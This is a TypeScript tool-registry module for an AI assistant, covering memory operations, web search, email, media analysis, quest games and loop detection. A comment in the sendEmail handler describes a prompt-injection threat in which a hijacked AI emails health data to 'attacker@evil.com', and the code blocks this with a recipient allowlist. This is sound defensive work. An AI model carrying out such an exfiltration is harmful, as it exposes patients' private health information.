import { ChatMessage, ChatState } from "./chat-handler";
import { CREDITS_PER_WEB_SEARCH } from "./cost-helpers";
import { GPTFunctionToolCall, GPTToolCall, GPTFunctionCallItem, JSONSchema } from "./gpt";
import { sendEmail } from "./tools/email";
import { MemoryOperationResult, MemoryToolInput } from "./memory-types";
import { processMemoryToolResponse } from "./memory-system";
import { memDebug, memDebugSeparator } from "./memory-debug-log";
import { ArticleResponse, fetchPage, SearchItem, webSearch } from "./tools/search-engine";
import { getDistance } from "./tools/map-data";
import { analyzeMedia } from "./tools/gemini-media-analyzer";
import { generateImage } from "./tools/image-generator";
import { extractFrame } from "./tools/video-frame-extractor";
import { getFile, refreshFile, storeFile } from "./tools/media-file-cache";
import { AgentAPIEndpoint } from "@shared/schema";
import { lookupOrangeBook, OrangeBookQuery } from "../fda/orange-book-service";

const API_PREFIX = "api_";
const isProduction = process.env.NODE_ENV === 'production';
const hideLogs = isProduction; // Set to true to hide logs in production

// ============================================================================
// TYPES
// ============================================================================

export type ToolExecutor = (args: any) => Promise<any>;

/**
 * Arguments the assistant supplies to the createQuestGame tool. The host
 * session enriches them (locale fallback, ownership, auto-assignment) and
 * seeds a tiny valid starter game — see sessionService's onCreateQuestGame.
 * The AI then builds the game out via manageMemory on Context_QuestGame.
 */
export interface CreateQuestGameToolArgs {
  /** Optional working title for the new game. */
  title?: string;
  /** BCP-47; defaults to the student's primary language. */
  language?: string;
}

/**
 * Custom memory processor function type.
 * Allows external systems to inject their own memory handling logic
 * (e.g., database-backed memory with sync).
 */
export type MemoryProcessor = (
  input: MemoryToolInput
) => Promise<{
  results: MemoryOperationResult[];
  updatedMemoryValues: any;
  updatedMemoryState: any;
}>;

/**
 * Tool registry interface - all available tools
 */
export interface ToolRegistry {
  describeActions: (args: { actionDescription: string }) => Promise<any>;
  apiCall: (toolCall: GPTFunctionToolCall) => Promise<any>;
  openTopic: (args: { topic: string }) => Promise<{ success: boolean; error?: string }>;
  manageMemory: (input: MemoryToolInput) => Promise<MemoryOperationResult[]>;
  webSearch: (args: { query: string }) => Promise<SearchItem[]>;
  fetchPage: (args: { url: string }) => Promise<ArticleResponse | null>;
  sendEmail: (args: { to: string; subject: string; html: string }) => Promise<any>;
  getDistance: (args: { from: string; to: string }) => Promise<any>;
  listRooms: (args: {}) => Promise<any>;
  setRooms: (args: { roomIds: string[] }) => Promise<any>;
  spawn: (args: { subAgentId: string }) => Promise<any>;
  despawn: (args: { subAgentId: string }) => Promise<any>;
  pruneMessages: (args: { forget: number[]; summary: string; closePaths?: string[] }) => Promise<any>;
  navigateToFeature: (args: { feature: string }) => Promise<any>;
  selectStudent: (args: { studentId: string }) => Promise<any>;
  captionVideo: (args: { customInstructions?: string }) => Promise<any>;
  analyzeMedia: (args: { instruction: string; context?: string; files: string[] }) => Promise<any>;
  extractVideoFrame: (args: { fileId: string; timestampSeconds: number }) => Promise<any>;
  generateImage: (args: { instruction: string; referenceImageFileId?: string }) => Promise<any>;
  fdaOrangeBook: (args: OrangeBookQuery) => Promise<any>;
  createQuestGame: (args: CreateQuestGameToolArgs) => Promise<any>;
  validateQuestGame: (args: {}) => Promise<any>;
}

// ============================================================================
// LOOP DETECTION
// ============================================================================

/**
 * Configuration for loop detection.
 * Can be customized per-session or per-system.
 */
export interface LoopDetectionConfig {
  /** Maximum number of identical sequence repetitions before breaking */
  maxRepetitions: number;
  /** Maximum number of recent tool call sequences to track */
  maxHistorySize: number;
  /** Whether loop detection is enabled */
  enabled: boolean;
}

/**
 * Default loop detection configuration.
 */
export const DEFAULT_LOOP_DETECTION_CONFIG: LoopDetectionConfig = {
  maxRepetitions: 3,
  maxHistorySize: 100,
  enabled: true,
};

/**
 * Tracks tool call sequences for loop detection.
 */
export interface LoopDetector {
  /** Record a tool call and its response */
  record(toolName: string, args: any, response: any): void;
  /** Check if we're in a loop (same sequence repeated too many times) */
  isLooping(): boolean;
  /** Get the current repetition count for the detected pattern */
  getRepetitionCount(): number;
  /** Reset the detector */
  reset(): void;
  /** Get a message explaining the loop if one is detected */
  getLoopMessage(): string | null;
}

/**
 * Creates a loop detector with the given configuration.
 */
export function createLoopDetector(config: LoopDetectionConfig = DEFAULT_LOOP_DETECTION_CONFIG): LoopDetector {
  // Each entry: hash of (toolName + args + response)
  const history: string[] = [];
  let detectedPatternLength = 0;
  let repetitionCount = 0;

  /**
   * Recursively sort object keys at ALL nesting levels for deterministic serialization.
   */
  function stableStringify(val: any): string {
    if (val === null || val === undefined) return String(val);
    if (typeof val !== 'object') return JSON.stringify(val);
    if (Array.isArray(val)) return '[' + val.map(stableStringify).join(',') + ']';
    return '{' + Object.keys(val).sort().map(k => JSON.stringify(k) + ':' + stableStringify(val[k])).join(',') + '}';
  }

  /**
   * Create a deterministic hash of a tool call and response.
   */
  function hashEntry(toolName: string, args: any, response: any): string {
    return `${toolName}:${stableStringify(args)}:${stableStringify(response)}`;
  }

  /**
   * Check if the last N entries repeat a pattern.
   * Returns the pattern length if found, 0 otherwise.
   */
  function findRepeatingPattern(): { patternLength: number; repetitions: number } {
    if (history.length < 2) return { patternLength: 0, repetitions: 0 };

    // Try pattern lengths from 1 to half the history
    const maxPatternLen = Math.floor(history.length / 2);
    
    for (let patternLen = 1; patternLen <= maxPatternLen; patternLen++) {
      // Check if we have at least config.maxRepetitions of this pattern
      const requiredLen = patternLen * config.maxRepetitions;
      if (history.length < requiredLen) continue;

      // Get the pattern (last patternLen entries)
      const pattern = history.slice(-patternLen);
      
      // Count how many times it repeats
      let reps = 1;
      for (let i = history.length - patternLen * 2; i >= 0; i -= patternLen) {
        const segment = history.slice(i, i + patternLen);
        if (segment.length !== patternLen) break;
        
        let matches = true;
        for (let j = 0; j < patternLen; j++) {
          if (segment[j] !== pattern[j]) {
            matches = false;
            break;
          }
        }
        
        if (matches) {
          reps++;
        } else {
          break;
        }
      }

      if (reps >= config.maxRepetitions) {
        return { patternLength: patternLen, repetitions: reps };
      }
    }

    return { patternLength: 0, repetitions: 0 };
  }

  return {
    record(toolName: string, args: any, response: any) {
      if (!config.enabled) return;
      
      const hash = hashEntry(toolName, args, response);
      history.push(hash);

      // Trim history if too long
      while (history.length > config.maxHistorySize) {
        history.shift();
      }

      // Check for loop
      const { patternLength, repetitions } = findRepeatingPattern();
      detectedPatternLength = patternLength;
      repetitionCount = repetitions;
    },

    isLooping(): boolean {
      if (!config.enabled) return false;
      return detectedPatternLength > 0 && repetitionCount >= config.maxRepetitions;
    },

    getRepetitionCount(): number {
      return repetitionCount;
    },

    reset() {
      history.length = 0;
      detectedPatternLength = 0;
      repetitionCount = 0;
    },

    getLoopMessage(): string | null {
      if (!this.isLooping()) return null;
      
      const patternDesc = detectedPatternLength === 1 
        ? "the same operation" 
        : `a sequence of ${detectedPatternLength} operations`;
      
      return `Loop detected: ${patternDesc} has been repeated ${repetitionCount} times with identical results. ` +
        `This usually indicates the operation cannot achieve the desired outcome. ` +
        `Please provide a direct response to the user instead of retrying.`;
    }
  };
}

/**
 * Dependencies for creating a tool registry.
 * External systems can customize behavior by providing optional overrides.
 */
export interface ToolRegistryDeps {
  agent: any;
  openedTopics: string[];
  memoryValuesRef: { current: any };
  chatStateRef: { current: ChatState };
  onUpdateMemoryValues?: (v: any) => Promise<void>;
  onUpdateChatState?: (v: ChatState) => Promise<void>;
  onCreditsUsed?: (v: number) => Promise<void>;
  onThinkingUpdate?: (description: string) => void;
  onNavigate?: (feature: string) => void;
  onSelectStudent?: (studentId: string) => void;
  onFilesNeeded?: (files: Array<{ fileId: string; filename: string }>) => void;

  /**
   * Optional callback for pruneMessages tool.
   * When provided, allows the AI to manually compress conversation history.
   */
  onPruneMessages?: (forget: number[], summary: string, closePaths?: string[]) => Promise<{ removed: number; warnings: string[]; historyLength: number }>;

  /**
   * Optional custom memory processor.
   * When provided, this replaces the default processMemoryToolResponse.
   * Use this to inject database-backed memory systems.
   */
  memoryProcessor?: MemoryProcessor;

  /**
   * Optional goal-tree quest-game authoring capabilities. Injected by host
   * sessions that have a user + customApps license (clinician chat); absent
   * sessions (CRM, AAC moderator) neither declare nor execute the tools.
   *  - onCreateQuestGame: seed a valid starter game and open it in the panel.
   *  - onValidateQuestGame: certify the game currently open in Context_QuestGame.
   */
  onCreateQuestGame?: (args: CreateQuestGameToolArgs) => Promise<unknown>;
  onValidateQuestGame?: (contentPack: unknown, appId?: string) => Promise<unknown>;

  /**
   * Optional loop detection configuration.
   * If not provided, uses DEFAULT_LOOP_DETECTION_CONFIG.
   */
  loopDetectionConfig?: LoopDetectionConfig;
}

// ============================================================================
// DEFAULT TOOL REGISTRY
// ============================================================================

/**
 * Creates the default tool registry with all standard tools.
 * 
 * @param deps - Dependencies including refs, callbacks, and optional overrides
 * @returns ToolRegistry with all tools configured
 */
export function defaultToolRegistry(deps: ToolRegistryDeps): ToolRegistry {
  // =========================================================================
  // RACE CONDITION FIX: Persistent accumulator for visible paths
  // =========================================================================
  const visiblePathsAccumulator = new Set<string>(
    deps.chatStateRef.current.memoryState?.visible || []
  );

  // =========================================================================
  // LOOP DETECTION
  // =========================================================================
  const loopDetector = createLoopDetector(
    deps.loopDetectionConfig || DEFAULT_LOOP_DETECTION_CONFIG
  );

  // =========================================================================
  // PER-TURN IMAGE BUDGET
  // =========================================================================
  // The registry is built once per turn, so this counter resets each turn.
  // generateImage is expensive AND the model is prone to runaway loops with it
  // (the hila session fired 24 calls in one turn, drifting off-topic). Cap it.
  const MAX_GENERATE_IMAGE_CALLS = 6;
  let generateImageCalls = 0;

  return {
    describeActions: async ({ actionDescription }) => {
      if (deps.onThinkingUpdate){
        deps.onThinkingUpdate(actionDescription);
        return { success: true };
      }
    },
    navigateToFeature: async ({ feature }) => {
      if (deps.onNavigate) {
        deps.onNavigate(feature);
        return { success: true, navigatedTo: feature };
      }
      return { success: false, reason: 'Navigation not available' };
    },
    selectStudent: async ({ studentId }) => {
      if (deps.onSelectStudent) {
        deps.onSelectStudent(studentId);
        return { success: true, selectedStudentId: studentId };
      }
      return { success: false, reason: 'Student selection not available' };
    },
    captionVideo: async () => {
      // The frontend opens the Video Caption panel and runs the pipeline on the
      // uploaded video (driven by the streamed `caption_video` event); the tool
      // result just confirms the hand-off so the model continues naturally.
      return { success: true, opened: true };
    },
    analyzeMedia: async ({ instruction, context, files }) => {
      const result = await analyzeMedia({ instruction, context, files });
      // If files have expired, notify the client to re-upload them
      if ((result as any).filesNeeded && deps.onFilesNeeded) {
        deps.onFilesNeeded((result as any).filesNeeded);
      }
      return result;
    },
    extractVideoFrame: async ({ fileId, timestampSeconds }) => {
      refreshFile(fileId);
      const cached = getFile(fileId);
      if (!cached) return { error: "File not found or expired" };
      if (!cached.mimeType.startsWith("video/")) return { error: "File is not a video" };
      const frameBuf = await extractFrame(cached.buffer, cached.mimeType, timestampSeconds);
      const frameId = storeFile(frameBuf, "image/png", `frame_${timestampSeconds}s.png`);
      // Only return the file ID — NOT the base64, to avoid bloating the conversation
      return { frameFileId: frameId, timestampSeconds };
    },
    generateImage: async ({ instruction, referenceImageFileId }) => {
      // Per-turn budget — stop runaway image loops before they burn cost/rounds.
      generateImageCalls++;
      if (generateImageCalls > MAX_GENERATE_IMAGE_CALLS) {
        return {
          error:
            `Image generation limit reached (${MAX_GENERATE_IMAGE_CALLS} per turn). ` +
            `Stop calling generateImage and respond to the user now with the ` +
            `images and information you already have.`,
        };
      }
      // Resolve file ID to base64 data URL for the API call
      let referenceImage: string | undefined;
      if (referenceImageFileId) {
        refreshFile(referenceImageFileId);
        const cached = getFile(referenceImageFileId);
        if (cached) {
          referenceImage = `data:${cached.mimeType};base64,${cached.buffer.toString("base64")}`;
        }
      }
      return generateImage({ instruction, referenceImage });
    },
    apiCall: async (toolCall: GPTFunctionToolCall) => {
      const fnName = toolCall.name;
      const endpointData = deps.agent.apiEndpoints.find(
        (endpoint: any) => `${API_PREFIX}${endpoint.name}` === fnName
      );
      if (!endpointData) {
        return { error: `API endpoint "${fnName}" not found.` };
      } else {
        const params = toolCall.arguments
          ? JSON.parse(toolCall.arguments)
          : {};
        try {
          if (!hideLogs) console.log("Calling API endpoint", endpointData.name, "with params:", params);
          const response = await callApiEndpoint(endpointData, params);
          return response;
        } catch (e: any) {
          return { error: e.message };
        }
      }
    },

    openTopic: async ({ topic }) => {
      if (!deps.openedTopics.includes(topic)) {
        deps.openedTopics.push(topic);
        return { success: true };
      } else {
        return { success: false, error: `Topic "${topic}" is already open.` };
      }
    },

    manageMemory: async (input: MemoryToolInput) => {
      memDebugSeparator('manageMemory called');
      memDebug('INPUT', input);

      // Check for loop BEFORE processing
      if (loopDetector.isLooping()) {
        const loopMessage = loopDetector.getLoopMessage();
        loopDetector.reset(); // Reset after breaking the loop
        memDebug('LOOP DETECTED', loopMessage);
        return [{
          target: input.path || 'unknown',
          action: input.action,
          ok: false,
          message: loopMessage || 'Loop detected. Please respond to the user directly.',
        }];
      }

      // Reject mutations on read-only fields
      const allFields: any[] = deps.agent.memoryFields || [];
      const inputOps = (input as any).ops || [input];
      const readOnlyViolations = inputOps.filter((op: any) => {
        if (!op.path || !op.action || op.action === 'view' || op.action === 'hide') return false;
        const rootId = op.path.split('/').filter(Boolean)[0];
        const field = allFields.find((f: any) => f.id === rootId);
        return field?.readOnly === true;
      });
      if (readOnlyViolations.length > 0) {
        memDebug('REJECTED — mutation on read-only field', readOnlyViolations);
        return readOnlyViolations.map((op: any) => ({
          target: op.path || 'unknown',
          action: op.action,
          ok: false,
          message: `This field is read-only. You cannot ${op.action} "${op.path}". Focus on responding to the user.`,
        }));
      }

      // Use custom processor if provided, otherwise use default
      let result;
      if (deps.memoryProcessor) {
        // Log relevant array values before processing
        const inputOps = (input as any).ops || [input];
        for (const op of inputOps) {
          if (op.path) {
            const parentPath = op.path.replace(/\/\d+$/, '');
            const parentKey = parentPath.replace(/^\//, '');
            const currentVal = deps.memoryValuesRef.current[parentKey];
            if (Array.isArray(currentVal)) {
              memDebug(`BEFORE ${op.action} ${op.path} — ${parentKey} array (${currentVal.length} items)`, currentVal);
            }
          }
        }

        result = await deps.memoryProcessor(input);
        
        // MERGE memoryValues instead of replacing
        deps.memoryValuesRef.current = {
          ...deps.memoryValuesRef.current,
          ...result.updatedMemoryValues
        };
        
        // ACCUMULATE visible paths into the persistent Set
        for (const path of result.updatedMemoryState?.visible || []) {
          visiblePathsAccumulator.add(path);
        }
        
        // Also preserve any paths that were already in the chat state
        for (const path of deps.chatStateRef.current.memoryState?.visible || []) {
          visiblePathsAccumulator.add(path);
        }
        
        // Write back the accumulated visible paths to the chat state
        deps.chatStateRef.current.memoryState = {
          ...deps.chatStateRef.current.memoryState,
          ...result.updatedMemoryState,
          visible: [...visiblePathsAccumulator]
        };
        
        // Notify callbacks
        if (deps.onUpdateMemoryValues) {
          await deps.onUpdateMemoryValues(deps.memoryValuesRef.current);
        }
        if (deps.onUpdateChatState) {
          await deps.onUpdateChatState(deps.chatStateRef.current);
        }

        memDebug('RESULTS', result.results);
        // Log relevant array values after processing
        const afterOps = (input as any).ops || [input];
        for (const op of afterOps) {
          if (op.path) {
            const parentPath = op.path.replace(/\/\d+$/, '');
            const parentKey = parentPath.replace(/^\//, '');
            const afterVal = deps.memoryValuesRef.current[parentKey];
            if (Array.isArray(afterVal)) {
              memDebug(`AFTER ${op.action} ${op.path} — ${parentKey} array (${afterVal.length} items)`, afterVal);
            }
          }
        }
      } else {
        // Default: use standard in-memory processor
        const memResult = processMemoryToolResponse(
          deps.agent.memoryFields || [],
          deps.memoryValuesRef.current,
          deps.chatStateRef.current.memoryState,
          input
        );
        
        result = {
          results: memResult.results,
          updatedMemoryValues: memResult.updatedMemoryValues,
          updatedMemoryState: memResult.updatedMemoryState,
        };
        
        // Apply same merge logic for default processor
        deps.memoryValuesRef.current = {
          ...deps.memoryValuesRef.current,
          ...result.updatedMemoryValues
        };
        
        // Accumulate visible paths
        for (const path of result.updatedMemoryState?.visible || []) {
          visiblePathsAccumulator.add(path);
        }
        
        deps.chatStateRef.current.memoryState = {
          ...deps.chatStateRef.current.memoryState,
          ...result.updatedMemoryState,
          visible: [...visiblePathsAccumulator]
        };
      }

      // Record for loop detection AFTER processing — but only for mutation operations.
      // View/hide operations are informational and should not trigger loop detection.
      const inputOpsForLoop = (input as any).ops || [input];
      const hasMutations = inputOpsForLoop.some(
        (op: any) => op.action && op.action !== 'view' && op.action !== 'hide'
      );
      if (hasMutations) {
        loopDetector.record('manageMemory', input, result.results);
      }

      return result.results;
    },

    webSearch: async ({ query }) => {
      if (!query) throw new Error("No query provided");
      const searchResults = await webSearch(query);
      return searchResults;
    },

    fetchPage: async ({ url }) => {
      if (!url) throw new Error("No url provided");
      const searchResults = await fetchPage(url);
      return searchResults;
    },

    sendEmail: async (args: { to: string; subject: string; html: string }) => {
      const mailOptions = deps.agent.tools?.email;
      if (!mailOptions) throw new Error("No email tool found");
      if (!mailOptions?.address) throw new Error("No email address found");
      if (!mailOptions?.username || !mailOptions?.password) {
        // The per-agent SMTP credentials must be set; previously the helper
        // would silently fall back to platform env-var creds and send from
        // Aivota's branded address.
        throw new Error("Email tool: per-agent SMTP credentials required");
      }

      // Hard recipient allowlist. Prompt-injection in any DB-sourced text
      // the AI reads (memory notes, search snippets, report fields, etc.)
      // can rewrite tool args; without this enforcement a hijacked AI calls
      // sendEmail({to: "attacker@evil.com", html: "<dump>"}) and exfiltrates
      // PHI directly. The allowlist sits server-side in the handler — schema
      // validation alone is not enough.
      const to = String(args.to || "").trim().toLowerCase();
      if (!to) throw new Error("Email tool: missing recipient");
      const allowedRecipients = (mailOptions.allowedRecipients ?? []).map((s: string) => s.toLowerCase());
      const allowedDomains = (mailOptions.allowedDomains ?? []).map((s: string) => s.toLowerCase().replace(/^@/, ""));
      if (allowedRecipients.length === 0 && allowedDomains.length === 0) {
        throw new Error("Email tool: refusing to send — no recipient allowlist configured for this agent");
      }
      const toDomain = to.split("@")[1] ?? "";
      const recipientAllowed =
        allowedRecipients.includes(to) || (toDomain && allowedDomains.includes(toDomain));
      if (!recipientAllowed) {
        console.warn(`[sendEmail] Refused recipient "${to}" — not in allowlist`);
        throw new Error(`Email tool: recipient ${to} is not on the agent's allowlist`);
      }

      const result = await sendEmail(
        {
          from: mailOptions.address,
          to: args.to,
          subject: args.subject,
          html: args.html,
        },
        mailOptions.service || "gmail",
        { user: mailOptions.username, pass: mailOptions.password },
      );
      return result;
    },

    getDistance: async (args: { from: string; to: string }) => {
      const result = await getDistance(args.from, args.to);
      return result;
    },

    listRooms: async () => {
      const result = {};
      return result;
    },

    setRooms: async (args: { roomIds: string[] }) => {
      // TODO: Implement room management
    },

    spawn: async (args: { subAgentId: string }) => {
      const result = {};
      return result;
    },

    despawn: async (args: { subAgentId: string }) => {
      const result = {};
      return result;
    },

    fdaOrangeBook: async (args: OrangeBookQuery) => {
      return lookupOrangeBook(args);
    },

    createQuestGame: async (args: CreateQuestGameToolArgs) => {
      if (!deps.onCreateQuestGame) {
        return { error: "Quest games are not available in this session." };
      }
      const result: any = await deps.onCreateQuestGame(args ?? {});
      // Seed the new game into the LIVE memory so the AI can start editing
      // /Context_QuestGame this same turn (the panel only round-trips it back
      // on the next request). Don't echo the whole pack to the model.
      if (result?.success && result.questGame) {
        deps.memoryValuesRef.current["Context_QuestGame"] = result.questGame;
        delete result.questGame;
      }
      return result;
    },

    validateQuestGame: async () => {
      if (!deps.onValidateQuestGame) {
        return { error: "Quest games are not available in this session." };
      }
      // Certify the CURRENT (possibly just-edited) game from live memory, not
      // the request-time snapshot the host session closed over. Pass the appId
      // too so the host can auto-save the certified game to its row.
      const open = deps.memoryValuesRef.current?.["Context_QuestGame"];
      const result: any = await deps.onValidateQuestGame(open?.contentPack, open?.appId);
      // On success the host returns the normalized/certified game — write it back
      // into live memory so the client store + a later manual Save stay valid.
      // Strip it from the model-facing result (don't echo the whole pack).
      if (result?.ok && result.game && open) {
        open.contentPack = result.game;
        delete result.game;
      }
      return result;
    },

    pruneMessages: async (args: { forget: number[]; summary: string; closePaths?: string[] }) => {
      if (deps.onPruneMessages) {
        return { success: true, ...(await deps.onPruneMessages(args.forget, args.summary, args.closePaths)) };
      }
      return { success: true, removed: 0 };
    },
  };
}

// ============================================================================
// MEMORY PROCESSOR FACTORIES
// ============================================================================

/**
 * Creates a standard in-memory processor (no database sync).
 * This is the default behavior when no custom processor is provided.
 */
export function createStandardMemoryProcessor(
  memoryFields: any[],
  memoryValuesRef: { current: any },
  memoryStateRef: { current: any }
): MemoryProcessor {
  return async (input: MemoryToolInput) => {
    const result = processMemoryToolResponse(
      memoryFields,
      memoryValuesRef.current,
      memoryStateRef.current,
      input
    );
    return {
      results: result.results,
      updatedMemoryValues: result.updatedMemoryValues,
      updatedMemoryState: result.updatedMemoryState,
    };
  };
}

/**
 * Creates a database-backed memory processor.
 * Use this with systems like ProgressModeManager that sync to a database.
 * 
 * @param dbProcessor - The database-aware processor function
 * @param memoryFields - Memory field definitions (with optional db ops)
 * @param memoryValuesRef - Reference to current memory values
 * @param memoryStateRef - Reference to current memory state
 * @param baseContext - Base context for database operations (e.g., { studentId, userId })
 */
export function createDBMemoryProcessor(
  dbProcessor: (
    memoryFields: any[],
    memoryValues: any,
    memoryState: any,
    loadState: any,
    input: MemoryToolInput,
    baseContext: Record<string, any>,
    fallbackProcessor: any
  ) => Promise<{
    updatedMemoryValues: any;
    updatedMemoryState: any;
    results: any[];
  }>,
  memoryFields: any[],
  memoryValuesRef: { current: any },
  memoryStateRef: { current: any },
  loadStateRef: { current: any },
  baseContext: Record<string, any>
): MemoryProcessor {
  return async (input: MemoryToolInput) => {
    if (!hideLogs) console.log('[createDBMemoryProcessor] Called with input:', JSON.stringify(input));
    if (!hideLogs) console.log('[createDBMemoryProcessor] Base context:', baseContext);
    if (!hideLogs) console.log('[createDBMemoryProcessor] Current memoryValues keys:', Object.keys(memoryValuesRef.current));
    const result = await dbProcessor(
      memoryFields,
      memoryValuesRef.current,
      memoryStateRef.current,
      loadStateRef.current,
      input,
      baseContext,
      processMemoryToolResponse
    );
    return {
      results: result.results,
      updatedMemoryValues: result.updatedMemoryValues,
      updatedMemoryState: result.updatedMemoryState,
    };
  };
}

// ============================================================================
// API ENDPOINT HELPERS
// ============================================================================

export async function callApiEndpoint(
  endpoint: AgentAPIEndpoint,
  params: { [key: string]: any } = {}
): Promise<any> {
  if (!endpoint || !endpoint.name || !endpoint.url) {
    throw new Error("Invalid API endpoint");
  }

  if (!hideLogs) console.log(`Calling ${endpoint.name} with params:`, params);

  try {
    const body =
      endpoint.useRpc || endpoint.protocol === "jsonrpc"
        ? {
            jsonrpc: "2.0",
            id: Math.floor(Math.random() * 1_000_000),
            method: endpoint.name,
            params,
          }
        : params;

    const response = await fetch(endpoint.url, {
      method: endpoint.method || "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(body),
    });

    const responseBody = (await response.json()) as any;
    if (responseBody?.error) throw new Error(responseBody.error.message);

    if (!hideLogs) console.log(`HTTP endpoint ${endpoint.name} response:`, responseBody);
    return responseBody.result ?? responseBody;
  } catch (e: any) {
    throw new Error(`Error calling ${endpoint.name}: ${e.message}`);
  }
}

// ============================================================================
// TOOL CALL MESSAGE HELPERS
// ============================================================================

/**
 * Helper type guards/utilities
 */
type NonRefSchema = Exclude<JSONSchema, { $ref: string }>;

function isRefSchema(s: JSONSchema): s is { $ref: string } {
  return typeof s === "object" && s !== null && "$ref" in s;
}

function isPlainObject(v: unknown): v is Record<string, unknown> {
  return typeof v === "object" && v !== null && !Array.isArray(v);
}

function isKeySchema(s: JSONSchema): s is NonRefSchema & { type: "key" } {
  return !isRefSchema(s) && (s as NonRefSchema).type === "key";
}

function getObjectProps(s: JSONSchema): Record<string, JSONSchema> | undefined {
  if (isRefSchema(s)) return undefined;
  const props = (s as NonRefSchema).properties;
  return props && typeof props === "object" ? (props as Record<string, JSONSchema>) : undefined;
}

function lookupKeyValue(values: Record<string, any>, name: string, path: string[]): any | undefined {
  if (Object.prototype.hasOwnProperty.call(values, name)) return values[name];
  const dotted = [...path, name].join(".");
  if (Object.prototype.hasOwnProperty.call(values, dotted)) return values[dotted];
  return undefined;
}

function insertKeysForProperty(
  parentArgs: Record<string, any>,
  propName: string,
  schema: JSONSchema,
  values: Record<string, any>,
  pathSoFar: string[]
): boolean {
  if (isRefSchema(schema)) return false;

  if (isKeySchema(schema)) {
    const v = lookupKeyValue(values, propName, pathSoFar);
    if (v !== undefined) {
      parentArgs[propName] = v;
      return true;
    }
    return false;
  }

  const childProps = getObjectProps(schema);
  if (childProps) {
    const existing = isPlainObject(parentArgs[propName])
      ? (parentArgs[propName] as Record<string, any>)
      : {};
    let mutated = false;

    for (const [childName, childSchema] of Object.entries(childProps)) {
      const didMutate = insertKeysForProperty(
        existing,
        childName,
        childSchema,
        values,
        [...pathSoFar, propName]
      );
      mutated = mutated || didMutate;
    }

    if (mutated) {
      parentArgs[propName] = existing;
      return true;
    }
  }

  return false;
}

export function enrichToolCallMessage(
  toolCallMessage: ChatMessage,
  apiEndpoints: AgentAPIEndpoint[],
  values: { [key: string]: any }
): ChatMessage {
  if (!toolCallMessage.toolCalls) return toolCallMessage;

  toolCallMessage.toolCalls.forEach((toolCall: GPTFunctionToolCall) => {
    if (toolCall.type !== "function_call") return;
    if (!toolCall.name?.startsWith(API_PREFIX)) return;

    const endpoint = apiEndpoints.find(
      (ep) => `${API_PREFIX}${ep.name}` === toolCall.name
    );
    if (!endpoint) return;

    let args: unknown;
    try {
      args = JSON.parse(toolCall.arguments || "{}");
    } catch {
      return;
    }
    if (!isPlainObject(args)) return;

    for (const p of endpoint.properties ?? []) {
      const { name, ...schema } = p;
      if (!name) continue;
      insertKeysForProperty(args as Record<string, any>, name, schema as JSONSchema, values, []);
    }

    toolCall.arguments = JSON.stringify(args);
  });

  return toolCallMessage;
}

export async function makeToolCalls(
  registry: ToolRegistry,
  toolCallMessage: ChatMessage
): Promise<ChatMessage[]> {
  const toolCallMessages: ChatMessage[] = [toolCallMessage];

  if (!toolCallMessage.toolCalls) return toolCallMessages;

  const toolCalls = toolCallMessage.toolCalls as GPTFunctionToolCall[];

  const insertToolCallResponse = (toolCall: GPTFunctionToolCall, response: any, credits?: number) => {
    const message: ChatMessage = {
      role: "tool",
      toolCallId: toolCall.call_id,
      content: JSON.stringify(response),
      timestamp: Date.now(),
      credits: credits || 0,
    };
    toolCallMessages.push(message);
  };

  await Promise.all(
    toolCalls.map(async (toolCall) => {
      try {
        let response;
        if (toolCall.type === "function_call") {
          if (toolCall.name?.startsWith(API_PREFIX)) {
            response = await registry.apiCall(toolCall);
            insertToolCallResponse(toolCall, response);
          } else {
            let args = toolCall.arguments
              ? JSON.parse(toolCall.arguments)
              : {};
            let response;
            switch (toolCall.name) {
              case "describeActions":
                response = await registry.describeActions(args as { actionDescription: string });
                insertToolCallResponse(toolCall, response);
                break;
              case "openTopic":
                response = await registry.openTopic(args as { topic: string });
                insertToolCallResponse(toolCall, response);
                break;
              case "manageMemory":
                response = await registry.manageMemory(args);
                insertToolCallResponse(toolCall, response);
                break;
              case "webSearch":
                response = await registry.webSearch(args);
                insertToolCallResponse(toolCall, response, CREDITS_PER_WEB_SEARCH);
                break;
              case "fetchPage":
                response = await registry.fetchPage(args);
                insertToolCallResponse(toolCall, response, CREDITS_PER_WEB_SEARCH);
                break;
              case "sendEmail":
                response = await registry.sendEmail(
                  args as { to: string; subject: string; html: string }
                );
                insertToolCallResponse(toolCall, response);
                break;
              case "getDistance":
                response = await registry.getDistance(args as { from: string; to: string });
                insertToolCallResponse(toolCall, response);
                break;
              case "pruneMessages":
                response = await registry.pruneMessages(args);
                insertToolCallResponse(toolCall, response);
                break;
              case "navigateToFeature":
                response = await registry.navigateToFeature(args as { feature: string });
                insertToolCallResponse(toolCall, response);
                break;
              case "selectStudent":
                response = await registry.selectStudent(args as { studentId: string });
                insertToolCallResponse(toolCall, response);
                break;
              case "captionVideo":
                response = await registry.captionVideo(args as { customInstructions?: string });
                insertToolCallResponse(toolCall, response);
                break;
              case "analyzeMedia":
                response = await registry.analyzeMedia(args as { instruction: string; context?: string; files: string[] });
                insertToolCallResponse(toolCall, response, response?.credits || 0);
                break;
              case "extractVideoFrame":
                response = await registry.extractVideoFrame(args as { fileId: string; timestampSeconds: number });
                insertToolCallResponse(toolCall, response);
                break;
              case "generateImage":
                response = await registry.generateImage(args as { instruction: string; referenceImageFileId?: string });
                insertToolCallResponse(toolCall, response, response?.credits || 0);
                break;
              case "fdaOrangeBook":
                response = await registry.fdaOrangeBook(args as OrangeBookQuery);
                insertToolCallResponse(toolCall, response);
                break;
              case "createQuestGame":
                response = await registry.createQuestGame(args as CreateQuestGameToolArgs);
                insertToolCallResponse(toolCall, response);
                break;
              case "validateQuestGame":
                response = await registry.validateQuestGame(args as {});
                insertToolCallResponse(toolCall, response);
                break;
              default:
                insertToolCallResponse(toolCall, {
                  error: `Unknown tool: ${toolCall.name}`,
                });
                break;
            }
          }
        }
      } catch (e: any) {
        insertToolCallResponse(toolCall, { error: e.message });
      }
    })
  );

  return toolCallMessages;
}